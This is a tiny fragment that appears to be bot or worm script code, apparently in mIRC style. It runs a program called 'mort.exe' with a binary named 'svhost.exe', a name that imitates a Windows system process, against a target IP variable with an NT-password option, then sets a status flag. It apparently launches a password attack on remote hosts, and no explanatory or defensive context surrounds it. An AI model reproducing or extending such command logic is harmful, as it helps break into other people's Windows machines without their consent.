  run mort.exe svhost.exe -host %ip -ntpass -t 150,75
  set %status 1
}
